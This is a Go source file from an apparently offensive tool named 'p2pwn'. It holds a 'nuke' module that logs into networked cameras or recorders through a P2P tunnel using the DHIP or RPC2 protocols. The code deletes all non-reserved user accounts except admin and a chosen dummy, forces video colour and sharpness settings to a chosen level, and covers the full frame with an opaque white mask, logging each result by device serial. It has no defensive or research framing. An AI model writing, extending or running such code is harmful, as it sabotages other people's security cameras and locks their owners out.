package core

// experimental do not use very dangerous

import (
	"fmt"
	"strings"

	"github.com/thebadinteger/p2pwn/core/p2p"
)

type nukeSession struct {
	get    func(name string) ([]any, error)
	set    func(name string, table any) error
	call   func(method string, params map[string]any) (map[string]any, error)
	closer func()
}

func (n NukeConfig) videoLevel() int {
	if n.Video == nil {
		return 0
	}
	v, err := getIntValue(n.Video)
	if err != nil || v <= 0 {
		return 0
	}
	return v
}

func (n NukeConfig) enabled() bool {
	return n.Delete || n.Box || n.videoLevel() > 0
}

func newNukeSession(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
	dhipErr := error(nil)
	if s, err := newNukeDHIP(tunnel, login, pass); err == nil {
		return s, nil
	} else {
		dhipErr = err
	}
	s, rpcErr := newNukeRPC2(tunnel, login, pass)
	if rpcErr != nil {
		return nil, fmt.Errorf("dhip 5000: %v rpc 80: %v", dhipErr, rpcErr)
	}
	return s, nil
}

func newNukeDHIP(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
	dhip, err := tunnel.NewDHIPClientOnPort(5000)
	if err != nil {
		return nil, err
	}
	if err := dhip.LoginNormal(login, pass); err != nil {
		dhip.Close()
		return nil, err
	}
	id := 100
	return &nukeSession{
		get: func(name string) ([]any, error) {
			return dhipGetTable(dhip, name, id)
		},
		set: func(name string, table any) error {
			return dhipSetConfig(dhip, name, table, id)
		},
		call: func(method string, params map[string]any) (map[string]any, error) {
			return dhip.Call(method, params, id, nil, nil)
		},
		closer: func() { dhip.Close() },
	}, nil
}

func newNukeRPC2(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
	osd, err := newRPC2Session(tunnel, login, pass)
	if err != nil {
		return nil, err
	}
	id := 100
	return &nukeSession{
		get: func(name string) ([]any, error) {
			return rpc2GetTable(osd.conn, osd.sess, osd.cookie, name, id)
		},
		set: func(name string, table any) error {
			return rpc2SetConfig(osd.conn, osd.sess, osd.cookie, name, table, id)
		},
		call: func(method string, params map[string]any) (map[string]any, error) {
			out, _, err := osd.conn.post("/RPC2", map[string]any{
				"method": method, "params": params, "id": id, "session": osd.sess,
			}, osd.cookie)
			return out, err
		},
		closer: osd.close,
	}, nil
}

func dhipSetConfig(dhip *p2p.DHIPClient, name string, table any, id int) error {
	r, err := dhip.Call("configManager.setConfig", map[string]any{
		"name": name, "table": table, "options": []any{},
	}, id, nil, nil)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); !ok {
		return fmt.Errorf("setConfig %s rejected: %v", name, r["error"])
	}
	return nil
}

func rpc2SetConfig(conn *rpc2ConnSession, sess any, cookie, name string, table any, id int) error {
	r, _, err := conn.post("/RPC2", map[string]any{
		"method": "configManager.setConfig",
		"params": map[string]any{"name": name, "table": table, "options": []any{}},
		"id":     id, "session": sess,
	}, cookie)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); !ok {
		return fmt.Errorf("setConfig %s rejected: %v", name, r["error"])
	}
	return nil
}

func nukeKeepUser(name, dummy string) bool {
	if name == "" || name == "admin" {
		return true
	}
	if dummy != "" && name == dummy {
		return true
	}
	return strings.EqualFold(name, "Admin")
}

func nukeDeleteUsers(s *nukeSession, dummy string) (int, error) {
	r, err := s.call("userManager.getUserInfoAll", nil)
	if err != nil {
		return 0, err
	}
	if ok, _ := r["result"].(bool); !ok {
		return 0, fmt.Errorf("getUserInfoAll rejected: %v", r["error"])
	}
	users, _ := r["params"].(map[string]any)
	list, _ := users["users"].([]any)
	removed := 0
	for _, raw := range list {
		u, ok := raw.(map[string]any)
		if !ok {
			continue
		}
		name, _ := u["Name"].(string)
		if reserved, _ := u["Reserved"].(bool); reserved {
			continue
		}
		if nukeKeepUser(name, dummy) {
			continue
		}
		if _, err := s.call("userManager.deleteUser", map[string]any{"name": name}); err != nil {
			return removed, err
		}
		removed++
	}
	return removed, nil
}

func nukeColorSections(level int) []any {
	sections := make([]any, 0, 3)
	sections = append(sections, map[string]any{
		"Brightness": level, "ChromaSuppress": 50, "Contrast": level,
		"Gamma": level, "Hue": 50, "Saturation": level,
		"Style": "Standard", "TimeSection": "1 00:00:00-24:00:00",
	})
	for i := 0; i < 2; i++ {
		sections = append(sections, map[string]any{
			"Brightness": level, "ChromaSuppress": 50, "Contrast": level,
			"Gamma": level, "Hue": 50, "Saturation": level,
			"Style": "Standard", "TimeSection": "0 00:00:00-24:00:00",
		})
	}
	return sections
}

func nukeSharpSections(level int) []any {
	sharp := make([]any, 0, 3)
	for i := 0; i < 3; i++ {
		sharp = append(sharp, map[string]any{"Level": 50, "Mode": 1, "Sharpness": level})
	}
	return sharp
}

func nukeChannelTable(channels int, mk func() []any) []any {
	pad := 32
	if channels > pad {
		pad = channels
	}
	table := make([]any, 0, pad)
	for ch := 0; ch < pad; ch++ {
		if ch < channels {
			table = append(table, mk())
		} else {
			table = append(table, nil)
		}
	}
	return table
}

func nukeVideoSet(s *nukeSession, channels, level int) error {
	if channels < 1 {
		channels = 1
	}
	mkColor := func() []any { return nukeColorSections(level) }
	mkSharp := func() []any { return nukeSharpSections(level) }
	if channels == 1 {
		if err := s.set("VideoColor", []any{mkColor()}); err != nil {
			return err
		}
		return s.set("VideoInSharpness", []any{mkSharp()})
	}
	if err := s.set("VideoColor", nukeChannelTable(channels, mkColor)); err != nil {
		return err
	}
	return s.set("VideoInSharpness", nukeChannelTable(channels, mkSharp))
}

func nukeCovers() []any {
	return []any{map[string]any{
		"BackColor":    []int{255, 255, 255, 255},
		"FrontColor":   []int{255, 255, 255, 0},
		"EncodeBlend":  true,
		"PreviewBlend": true,
		"Rect":         []int{0, 0, 8191, 8191},
	}}
}

func nukeBox(s *nukeSession, channels int) error {
	table, err := s.get("VideoWidget")
	if err != nil {
		return err
	}
	covers := nukeCovers()
	patched := 0
	apply := func(raw any) {
		m, ok := raw.(map[string]any)
		if !ok {
			return
		}
		m["Covers"] = covers
		patched++
	}
	for _, raw := range table {
		if nested, ok := raw.([]any); ok {
			for _, item := range nested {
				apply(item)
			}
			continue
		}
		apply(raw)
	}
	if patched == 0 {
		return fmt.Errorf("VideoWidget table shape unknown")
	}
	return s.set("VideoWidget", table)
}

func runNuke(tunnel *p2p.PTCPTunnel, login, pass string, channels int, cfg NukeConfig, dummy string, serial string, armed bool) {
	if !armed || !cfg.enabled() {
		return
	}
	s, err := newNukeSession(tunnel, login, pass)
	if err != nil {
		LogNukeResult(serial, "session", false, err)
		return
	}
	defer s.closer()

	if cfg.Delete {
		n, err := nukeDeleteUsers(s, dummy)
		if err != nil {
			LogNukeResult(serial, "delete", false, err)
		} else {
			LogNukeResult(serial, fmt.Sprintf("delete removed %d users", n), true, nil)
		}
	}
	if level := cfg.videoLevel(); level > 0 {
		if err := nukeVideoSet(s, channels, level); err != nil {
			LogNukeResult(serial, "video", false, err)
		} else {
			LogNukeResult(serial, fmt.Sprintf("video set to %d", level), true, nil)
		}
	}
	if cfg.Box {
		if err := nukeBox(s, channels); err != nil {
			LogNukeResult(serial, "box", false, err)
		} else {
			LogNukeResult(serial, "box applied", true, nil)
		}
	}
}
